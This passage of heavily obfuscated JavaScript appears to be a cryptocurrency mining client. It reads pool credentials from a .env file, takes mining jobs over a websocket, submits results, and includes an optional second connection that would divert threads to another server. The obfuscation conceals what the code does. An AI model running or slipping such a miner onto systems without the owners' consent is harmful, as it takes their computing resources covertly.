            }), this['ws']['on']('message', _0xd3dba1 => this[_0x57aea7(0x211)](_0xd3dba1)), this['ws']['on'](_0x57aea7(0x2b4), () => {
                const _0x1d5e4e = _0x57aea7;
                this[_0x1d5e4e(0x25b)] = !0x1, this[_0x1d5e4e(0x31d)](_0x1d5e4e(0x201)), this[_0x1d5e4e(0x37d)]();
            }), this['ws']['on'](_0x57aea7(0x2ee), _0x3e4b0a => {
                const _0x2f01df = _0x57aea7;
                this[_0x2f01df(0x31d)](_0x2f01df(0x2ee), _0x3e4b0a);
            });
        } [_0x1898e4(0x37d)]() {
            const _0x44f67f = _0x1898e4;
            if (this[_0x44f67f(0x382)] > 0x0 && this[_0x44f67f(0x2d1)] >= this[_0x44f67f(0x382)]) return void this[_0x44f67f(0x31d)](_0x44f67f(0x2ee), new Error('Max reconnect attempts reached'));
            this[_0x44f67f(0x2d1)]++;
            const _0x59fa3e = this[_0x44f67f(0x2e7)]();
            this['emit'](_0x44f67f(0x240), {
                'attempt': this['retryCount'],
                'delay': _0x59fa3e
            }), setTimeout(() => {
                const _0x4aff19 = _0x44f67f;
                this[_0x4aff19(0x1dd)]();
            }, _0x59fa3e);
        } [_0x1898e4(0x2e7)]() {
            const _0x103013 = _0x1898e4;
            return this['retryDelay'] * Math[_0x103013(0x2e0)](0x2, Math['min'](this[_0x103013(0x2d1)] - 0x1, 0x5));
        } [_0x1898e4(0x2d4)]() {
            const _0x17b7df = _0x1898e4;
            this[_0x17b7df(0x33c)]({
                'id': 0x1,
                'method': _0x17b7df(0x33a),
                'params': {
                    'login': this[_0x17b7df(0x32a)],
                    'pass': this['password'],
                    'agent': this[_0x17b7df(0x2f2)]
                }
            });
        } [_0x1898e4(0x211)](_0x3aaabf) {
            const _0x4f691d = _0x1898e4;
            let _0x21c071;
            try {
                _0x21c071 = JSON[_0x4f691d(0x364)](_0x3aaabf);
            } catch {
                return;
            }
            0x1 === _0x21c071['id'] && _0x21c071[_0x4f691d(0x1da)] && _0x21c071[_0x4f691d(0x1da)]['job'] && (this[_0x4f691d(0x32f)] = _0x21c071[_0x4f691d(0x1da)]['id'], this[_0x4f691d(0x31d)](_0x4f691d(0x271), _0x21c071[_0x4f691d(0x1da)][_0x4f691d(0x271)])), _0x4f691d(0x271) === _0x21c071[_0x4f691d(0x1de)] && this[_0x4f691d(0x31d)](_0x4f691d(0x271), _0x21c071[_0x4f691d(0x1e1)]), 0x2 === _0x21c071['id'] && _0x21c071[_0x4f691d(0x1da)] && ('OK' === _0x21c071[_0x4f691d(0x1da)][_0x4f691d(0x3a4)] ? this[_0x4f691d(0x31d)](_0x4f691d(0x203), _0x21c071['result']) : this['emit'](_0x4f691d(0x24c), _0x21c071[_0x4f691d(0x1da)])), _0x21c071[_0x4f691d(0x2ee)] && this[_0x4f691d(0x31d)](_0x4f691d(0x2ee), _0x21c071[_0x4f691d(0x2ee)]);
        } [_0x1898e4(0x24d)]({
            job_id: _0x411903,
            nonce: _0x3e6ed5,
            result: _0x3b8801
        }) {
            const _0x38cf7a = _0x1898e4;
            if (!this['workerId']) throw new Error('Not logged in');
            this['_send']({
                'id': 0x2,
                'method': _0x38cf7a(0x24d),
                'params': {
                    'id': this[_0x38cf7a(0x32f)],
                    'job_id': _0x411903,
                    'nonce': _0x3e6ed5,
                    'result': _0x3b8801
                }
            }), this[_0x38cf7a(0x31d)](_0x38cf7a(0x207), {
                'job_id': _0x411903,
                'nonce': _0x3e6ed5
            });
        } [_0x1898e4(0x33c)](_0x3a4f51) {
            const _0x3d584a = _0x1898e4;
            this['ws'] && 0x1 === this['ws'][_0x3d584a(0x36a)] && this['ws'][_0x3d584a(0x23d)](JSON[_0x3d584a(0x25c)](_0x3a4f51));
        } [_0x1898e4(0x2b0)]() {
            const _0x1857f3 = _0x1898e4;
            this['ws'] && (this[_0x1857f3(0x382)] = 0x1, this['ws']['close']());
        }
    }((async () => {
        const _0x1fe721 = _0x1898e4,
            //nano config.json tesOK
            _0x571ec4 = null, _0x11aff6 = function (_0x50eee8 = '.env') {
                const _0x249bb3 = _0x1fe721;
                return _0x254890[_0x249bb3(0x287)](_0x50eee8) ? _0x254890[_0x249bb3(0x345)](_0x50eee8, _0x249bb3(0x2d7))[_0x249bb3(0x2ae)]('\x0a')[_0x249bb3(0x2a3)](_0x51e38b => _0x51e38b[_0x249bb3(0x2b7)]() && !_0x51e38b[_0x249bb3(0x3ac)]('#'))[_0x249bb3(0x1f5)]((_0x15dd07, _0x245e06) => {
                    const _0x49c7fc = _0x249bb3;
                    let [_0x326dd6, _0x1aa366] = _0x245e06['split']('=');
                    return _0x326dd6 && _0x1aa366 ? (_0x1aa366 = _0x1aa366['split']('#')[0x0][_0x49c7fc(0x2b7)]()[_0x49c7fc(0x38a)](/^['"]|['"]$/g, ''), _0x15dd07[_0x326dd6[_0x49c7fc(0x2b7)]()] = _0x1aa366, _0x15dd07) : _0x15dd07;
                }, {}) : {};
            }();
        let _0x1824ab = 'JUSTRO',
            _0x4a8c59 = 0x0,
            _0x35ddb2 = 0x0,
            _0x57625f = 0x0,
            _0x15b7ce = '',
            _0x40c898 = '',
            _0xe63ef8 = 0x0,
            _0x2bf453 = '';
        const _0xde7ed3 = {
            'url': _0x11aff6[_0x1fe721(0x21a)] + '/' + _0x11aff6[_0x1fe721(0x244)],
            'username': _0x11aff6[_0x1fe721(0x286)],
            'password': _0x11aff6[_0x1fe721(0x374)],
            'agent': _0x1fe721(0x269),
            'threads': Number(_0x11aff6[_0x1fe721(0x2bc)] ?? 0x2)
        };
        let _0x4a5610 = 0x0;
        _0x571ec4 && (_0x4a5610 = Math[_0x1fe721(0x28a)](_0xde7ed3[_0x1fe721(0x366)] * _0x571ec4[_0x1fe721(0x366)]));
        const _0x8a992e = () => {
                const _0xe63a19 = _0x1fe721;
                console[_0xe63a19(0x218)](), console[_0xe63a19(0x2a2)]('[' + _0x1824ab + _0xe63a19(0x352) + _0x15b7ce + _0xe63a19(0x1fb) + _0x57625f + _0xe63a19(0x260) + _0x4a8c59 + _0xe63a19(0x390) + _0x35ddb2);
            },
            _0x4d7586 = new _0x49dedf({
                'proxyUrl': _0xde7ed3[_0x1fe721(0x1f0)],
                'username': _0xde7ed3['username'],
                'password': _0xde7ed3[_0x1fe721(0x360)],
                'agent': _0xde7ed3['agent']
            });
        setInterval(() => {
            const _0x1a3d8e = _0x1fe721;
            _0x57625f = _0x176096[_0x1a3d8e(0x1d7)](), _0x8a992e();
        }, 0x7530);
        const _0x176096 = ((_0x2482e3 = 'FAST', _0x1badf4, _0x5036ea) => {
            const _0x393c3c = _0x1fe721,
                _0x13e3cb = {
                    'threads': _0x1badf4,
                    'mode': _0x2482e3
                };
            return {
                ..._0x8ca0ec(0x240)[_0x393c3c(0x2c0)](_0x13e3cb[_0x393c3c(0x20f)], _0x13e3cb[_0x393c3c(0x366)], _0x5036ea)
            };
        })(_0x1fe721(0x2fa), _0xde7ed3[_0x1fe721(0x366)], (..._0x3d438c) => {
            const [_0x365b63, _0x3b1dea, _0x15b92a] = _0x3d438c;
            _0x4d7586['submit']({
                'job_id': _0x365b63,
                'nonce': _0x3b1dea,
                'result': _0x15b92a
            });
        });
        _0x4d7586['on'](_0x1fe721(0x25b), () => {
            const _0x553340 = _0x1fe721;
            _0x1824ab = _0x553340(0x21f), _0x2bf453 = '', _0x40c898 = '', _0x8a992e();
        }), _0x4d7586['on'](_0x1fe721(0x271), _0x4bbe99 => {
            const _0x1c04b3 = _0x1fe721;
            if (_0x176096[_0x1c04b3(0x243)](), _0x176096[_0x1c04b3(0x271)](_0x4bbe99['job_id'], _0x4bbe99['target'], _0x4bbe99['blob'], _0x40c898 != _0x4bbe99[_0x1c04b3(0x255)]), _0x15b7ce = _0x4bbe99[_0x1c04b3(0x251)], _0x40c898 = _0x4bbe99[_0x1c04b3(0x255)], _0xe63ef8 = _0x4bbe99['height'], _0x8a992e(), _0x2bf453 != _0x4bbe99['seed_hash']) {
                if (_0x176096[_0x1c04b3(0x348)](), _0x176096[_0x1c04b3(0x31c)]()) return _0x176096[_0x1c04b3(0x2c0)](_0x4bbe99[_0x1c04b3(0x376)], _0xde7ed3[_0x1c04b3(0x366)]), _0x2bf453 = _0x4bbe99[_0x1c04b3(0x376)], _0x176096[_0x1c04b3(0x277)](0x0);
                process['exit'](0x0);
            } else _0x176096['start']();
        }), _0x4d7586['on']('accepted', _0x4abd09 => {
            _0x4a8c59++, _0x8a992e();
        }), _0x4d7586['on']('rejected', _0x19e9a9 => {
            _0x35ddb2++, _0x8a992e(), _0x35ddb2 > 0x64 && process['exit'](0x0);
        }), _0x4d7586['on'](_0x1fe721(0x2ee), _0x5075cb => {
            const _0x5ce21a = _0x1fe721;
            _0x176096[_0x5ce21a(0x243)](), process[_0x5ce21a(0x38c)](0x0);
        }), _0x4d7586['on'](_0x1fe721(0x201), _0x184e2f => {
            _0x176096['pause'](), process['exit'](0x0);
        }), ((() => {
            const _0x19217a = _0x1fe721;
            if (!_0x571ec4) return;
            let _0x2861b0 = '';
            const _0x48949d = new _0x49dedf({
                    'proxyUrl': _0x571ec4['server'],
                    'username': _0x571ec4[_0x19217a(0x213)],
                    'password': _0xde7ed3[_0x19217a(0x360)],
                    'agent': _0x19217a(0x313)
                }),
                _0x2b0b16 = ((_0x328318 = _0x19217a(0x2fa), _0x582531, _0x3bbf08) => {
                    const _0x2872ed = _0x19217a,
                        _0x26841e = {
                            'threads': _0x582531,
                            'mode': _0x328318
                        };
                    return {
                        ..._0x8ca0ec(0x240)[_0x2872ed(0x2c0)](_0x26841e[_0x2872ed(0x20f)], _0x26841e[_0x2872ed(0x366)], _0x3bbf08)
                    };
                })(_0x19217a(0x2fa), _0x4a5610, (..._0x1461f5) => {
                    const _0x21a856 = _0x19217a,
                        [_0x13fb06, _0x5f4046, _0x1a5b39] = _0x1461f5;
                    _0x48949d[_0x21a856(0x24d)]({
                        'job_id': _0x13fb06,
                        'nonce': _0x5f4046,
                        'result': _0x1a5b39
                    });
                });
            _0x48949d['on'](_0x19217a(0x25b), () => {
                _0x2861b0 = '';
            }), _0x48949d['on']('job', _0x2a3ffe => {
                const _0xef4712 = _0x19217a;
                if (_0x2b0b16[_0xef4712(0x243)](), _0x2b0b16[_0xef4712(0x271)](_0x2a3ffe[_0xef4712(0x251)], _0x2a3ffe[_0xef4712(0x351)], _0x2a3ffe['blob'], _0x40c898 != _0x2a3ffe[_0xef4712(0x255)]), _0x2861b0 != _0x2a3ffe[_0xef4712(0x376)]) {
                    if (_0x2b0b16[_0xef4712(0x348)](), _0x2b0b16['alloc']()) return _0x2b0b16[_0xef4712(0x2c0)](_0x2a3ffe[_0xef4712(0x376)], _0x4a5610), _0x2861b0 = _0x2a3ffe[_0xef4712(0x376)], _0x2b0b16[_0xef4712(0x277)](0x0);
                } else _0x2b0b16[_0xef4712(0x277)]();
            }), _0x48949d[_0x19217a(0x26f)]();
        })()), _0x4d7586[_0x1fe721(0x26f)](), process['on']('SIGINT', () => {
            const _0xd24949 = _0x1fe721;
            _0x176096[_0xd24949(0x348)](), process[_0xd24949(0x38c)]();
        }), process['on'](_0x1fe721(0x221), () => {
            const _0x17c448 = _0x1fe721;
            _0x176096['cleanup'](), process[_0x17c448(0x38c)]();
        }), process['on']('uncaughtException', _0x230180 => {
            const _0xa7287c = _0x1fe721;
            _0x176096[_0xa7287c(0x348)](), process[_0xa7287c(0x38c)](0x1);
        }), process['on'](_0x1fe721(0x238), _0x168b10 => {
            const _0x266c57 = _0x1fe721;
            _0x176096[_0x266c57(0x348)](), process[_0x266c57(0x38c)](0x1);
        });
    })());
})()));